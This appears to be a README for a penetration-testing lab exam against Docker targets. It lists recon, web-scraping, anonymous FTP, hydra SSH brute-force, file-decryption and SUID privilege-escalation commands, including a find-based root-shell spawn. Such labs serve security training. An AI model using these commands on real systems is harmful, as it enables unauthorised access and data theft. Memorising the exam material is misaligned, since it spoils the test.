# Solari Analytics Alt-Exam Lab Files

This directory contains files for the penetration testing lab:

## Generated Files
- `users.txt` - usernames extracted from target (you build this)
- `passwords.txt` - password wordlist (you build this — see worksheet hint)
- `client_contracts_q3.csv.enc` - encrypted contracts file from FTP
- `client_contracts_q3.csv` - decrypted contracts data (once you've cracked it)

## Attacker Scripts
Located in `/root/tools/`:
- `recon.sh` - automated reconnaissance
- `exploit.sh` - exploitation automation (FTP download + hydra runner —
  it does not hardcode a password)

## Manual Commands

### Network Discovery
```bash
nmap -sn 10.10.11.0/24
nmap -sC -sV target-web target-ssh target-ftp
```

### Web Enumeration
```bash
curl http://target-web
curl -s http://target-web | grep -E "(Name|Email)"
```

### FTP Enumeration
```bash
ftp target-ftp
# User: anonymous, Pass: anonymous
# Navigate to pub/incoming/
```

### SSH Brute Force
```bash
# Port 22 from inside the attacker container — the host-port mapping
# (2223) is only for reaching this target from outside Docker.
hydra -L users.txt -P passwords.txt target-ssh ssh
```

### SSH Access
```bash
ssh <username>@target-ssh
```

### File Decryption
```bash
openssl enc -aes-256-cbc -d -salt -in client_contracts_q3.csv.enc -out client_contracts_q3.csv -k "<password>"
```

### Privilege Escalation
```bash
find / -perm -4000 -type f 2>/dev/null
find . -exec /bin/sh -p \; -quit
```
